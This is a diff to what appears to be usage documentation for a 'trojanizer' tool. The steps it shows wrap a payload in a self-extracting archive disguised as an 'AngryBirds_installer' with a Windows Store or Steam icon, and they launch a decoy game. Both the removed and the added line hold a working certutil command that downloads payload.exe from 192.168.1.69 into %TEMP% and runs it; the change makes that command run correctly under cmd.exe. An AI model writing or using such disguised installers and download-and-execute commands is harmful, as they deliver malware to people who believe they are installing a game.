@@ -111,7 +111,7 @@
     4º - running trojanizer tool
          PAYLOAD TO BE COMPRESSED => <path-to>/screenshot.png (it will not matter what you compress)
          EXECUTE THIS FILE UPON EXTRACTION => <path-to>/AngryBirds.exe (to be executed as decoy application)
-         PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://192.168.1.69/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
+         PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f http://192.168.1.69/payload.exe %TEMP%\\payload.exe && start %TEMP%\\payload.exe
          SFX FILENAME => AngryBirds_installer (the name of the sfx archive to be created)
          REPLACE ICON => Windows-Store.ico OR Steam-logo.ico
 
